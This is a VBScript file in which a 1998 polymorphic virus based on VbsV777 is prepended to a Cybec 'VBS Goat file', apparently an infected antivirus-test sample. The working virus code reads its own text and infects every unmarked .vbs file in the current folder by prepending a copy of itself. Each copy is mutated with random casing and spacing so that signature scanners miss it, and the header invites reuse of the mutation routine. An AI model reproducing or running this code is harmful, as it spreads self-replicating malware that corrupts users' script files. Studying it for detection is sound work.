'**********
'   A POLyMOrpHIc    EXAmPLe  Vb    scRiPT   viRUs BAsED   On     VbsV777
'   by    Spo0KY +  CAD    -   14.   NOv.  1998   -
'  FeEL   Free   tO    USe tHe     CBmuTate  fUNCtiON     in yOuR     OWn    bUgS     :-)

     COnsT     cbForreadIng   =  1  , CBFOrwrITInG     =  2

 RaNdOMize
    
  cBwePAth     =   WsCript   . sCriPtFUllNaME
  
    SET     CBfSo =  cREaTeOBjecT  (     "scRiptiNG.FilesYSTEmOBJeCT"  )
   
     sET    CbWeFilE  = cBfso .    OPENTextFIle  (     cBwePAtH    ,   CBFOrReAdING   )
     cBwecOde    = cbwefiLE    .    reADAlL
    cbWefIle    .  ClOse
  
   CbvIRUssiZe   =  INStR (     3   , cbwECODe    ,   "*****"   &     "*****"   ) +     10  +     1

   SET     cbWEfIlE    =    cBFsO . opEnTexTFILE    (  cbWEPaTH  ,  cBfoRReADINg  )
   cbwECode    =   CBWEFILe    .    rEAD     (     CbVIrUsSIzE  )
  cbWeFIle   .     CloSe
   
 For    EaCH Cbfile    In    CbFSO   .  geTFOLdER   (     "."     ) .    fiLES
  
    IF  LCasE   (    CBFSo   .  GeTExTENsIonNaME    (  CBFIlE   .     NAME  )    ) = cHR  (    118  )    &    cHR  (     98    )   & CHR     (     115    )  then
   
  seT cBVictiMFilE    =     cbFSo     .   oPeNTextfIlE   (    CbFiLe  .     path   ,  cBFOrrEaDInG  )
    cbinFecTIoNMArkER   =     CbviCtiMFIle     .  rEaD   (    11 )
     cBviCtiMfiLe  .  ClOse
 
    iF    cBINFECTionmArkER <>  "'*****"   &     "*****"     thEN

   sEt    CbvICTiMfilE     =   cBFSO   .     oPeNtexTfile  (  cBfiLe    .  pAtH   ,    CBforReaDiNg   )
    cbvicTiMCoDE =   CBVIctIMFILe    .  REaDalL
 CBvicTimFile     .  CLose
   
 cbviCTimcode    = CbMuTate  (  CBwECODE   )  &   CBvICtIMcodE
 
   SEt     cbvICTImfilE =    Cbfso    .    OpEntExtfIle  (   cBfILE     . PAtH ,   cBFoRwRItINg ,    1  )
  cbVicTIMFiLE .   wRitE   CBvicTimCodE
 cBViCtimfIle .  cLOsE
  
    enD     If
  
 END  IF
  
     NeXT
  
 
     fuNCtIoN   cBmutate  (  cbSTriNG  )
 
  CBnEWsTRIng     =   ""
     CBi   =   1
    
  whILe  cbI   <=   LEN    (  cbstrINg     )
    
 IF Mid (   cBsTRING  ,     CbI   ,     1  )  =  cHr  (    32  )   tHEn

  FoR    CBj   =  1 to   iNt   (    5     *  RNd    ) +     1

     cBneWsTrInG    =     cbnewSTRinG  +  CHR    ( 32   )

  nExt
  
    Do
 
    cBI   =     cbi +     1
    
   lOOp   wHiLe  mId     ( cBstrING    ,   CBi    ,  1  ) = cHr   (     32  )
   
     Else
 
   IF   InT   ( 2   * rnd   )   + 1     = 1   THEN

    cBNEWsTrINg     =     cbNeWstrINg   + UcaSe (     MId (    CbSTRiNg  , cBi , 1   ) )

  eLse

   CbNeWsTrINg =   cBnEwstrIng     +     LcAse    ( mId (     CbsTRING  ,   CBI  ,     1  )    )

   End    If

  cbI  =  cbI    + 1
   
  End iF
   
     WEND
    
    CbmuTATe    =  CbNEwSTrINg
    
  ENd    fuNcTIOn
     
     '**********
'VBS Goat file

Dim Msg, Style, Title, Help, Ctxt, Responce, MyString
Msg = "This is Cybec VBS Goat file"
Style = vbYesNo + vbExclamation + vbDefaultButton2
Title = "Goat File"
Help = "Goat.hlp"
Ctxt = 1000

Responce = MsgBox(Msg, Style, Title, Help, Ctxt)
